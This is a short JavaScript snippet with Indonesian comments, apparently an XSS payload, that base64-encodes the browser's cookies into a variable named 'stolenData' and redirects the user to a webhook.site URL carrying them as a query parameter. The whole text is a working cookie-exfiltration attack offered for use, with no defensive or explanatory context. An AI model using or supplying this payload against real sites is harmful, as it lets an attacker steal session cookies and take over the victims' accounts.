// Ambil cookie dan encode ke base64 biar aman di URL
var stolenData = btoa(document.cookie);

// Redirect user ke webhook Anda dengan membawa data
window.location.href = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + stolenData;
